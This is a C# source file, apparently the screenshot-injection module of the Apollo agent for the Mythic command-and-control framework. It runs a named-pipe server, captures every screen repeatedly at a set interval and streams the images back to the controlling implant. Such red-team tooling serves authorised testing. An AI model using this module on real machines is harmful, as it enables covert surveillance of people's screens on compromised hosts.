using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes.IO;
using ApolloInterop.Serializers;
using System.Collections.Concurrent;
using ApolloInterop.Classes;
using System.Threading;
using ApolloInterop.Classes.Core;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Interfaces;
using ST = System.Threading.Tasks;
using ApolloInterop.Enums.ApolloEnums;
using System.IO;
using System.IO.Pipes;
using ApolloInterop.Constants;
using ApolloInterop.Classes.Events;
using System.Windows.Forms;

namespace ScreenshotInject
{
    class Program
    {

        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static string _namedPipeName;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AsyncNamedPipeServer _server;
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private static CancellationTokenSource _cts = new CancellationTokenSource();
        private static Action<object> _sendAction;
        private static ST.Task _clientConnectedTask = null;

        static void Main(string[] args)
        {

            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];

            _sendAction = (object p) =>
            {
                PipeStream pipe = (PipeStream)p;

                while (pipe.IsConnected && !_cts.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[] {
                        _senderEvent,
                        _cts.Token.WaitHandle
                    });
                    if (_senderQueue.TryDequeue(out byte[] result))
                    {
                        pipe.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, pipe);
                    }
                }
                pipe.Flush();
                pipe.Close();
            };
            _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.MessageReceived += OnAsyncMessageReceived;
            _server.Disconnect += ServerDisconnect;
            _receiverEvent.WaitOne();
            if (_recieverQueue.TryDequeue(out IMythicMessage screenshotArgs))
            {
                if (screenshotArgs.GetTypeCode() != MessageType.IPCCommandArguments)
                {
                    throw new Exception($"Got invalid message type. Wanted {MessageType.IPCCommandArguments}, got {screenshotArgs.GetTypeCode()}");
                }
                uint count = 1;
                uint interval = 0;
                string[] parts = ((IPCCommandArguments)screenshotArgs).StringData.Split(' ');
                if (parts.Length > 0)
                {
                    count = uint.Parse(parts[0]);
                }
                if (parts.Length > 1)
                {
                    interval = uint.Parse(parts[1]);
                }
                for(int i = 0; i < count && !_cts.IsCancellationRequested; i++)
                {
                    byte[][] screens = Screenshot.GetScreenshots();
                    foreach(byte[] bScreen in screens)
                    {
                        AddToSenderQueue(new ScreenshotInformation(bScreen));
                    }
                    try
                    {
                        _cts.Token.WaitHandle.WaitOne((int)interval * 1000);
                    } catch (OperationCanceledException)
                    {
                        break;
                    }
                }
                while(_senderQueue.Count > 0)
                {
                    Thread.Sleep(1000);
                }
                _cts.Cancel();
            }


        }

        private static void ServerDisconnect(object sender, NamedPipeMessageArgs e)
        {
            _cts.Cancel();
        }

        private static bool AddToSenderQueue(IMythicMessage msg)
        {
            IPCChunkedData[] parts = _jsonSerializer.SerializeIPCMessage(msg, IPC.SEND_SIZE / 2);
            foreach(IPCChunkedData part in parts)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(part)));
            }
            _senderEvent.Set();
            return true;
        }

        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            // Potentially delete this since theoretically the sender Task does everything
            if (_senderQueue.TryDequeue(out byte[] data))
            {
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }

        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
        {
            // We only accept one connection at a time, sorry.
            if (_clientConnectedTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _clientConnectedTask = new ST.Task(_sendAction, args.Pipe);
            _clientConnectedTask.Start();
        }
    }
}
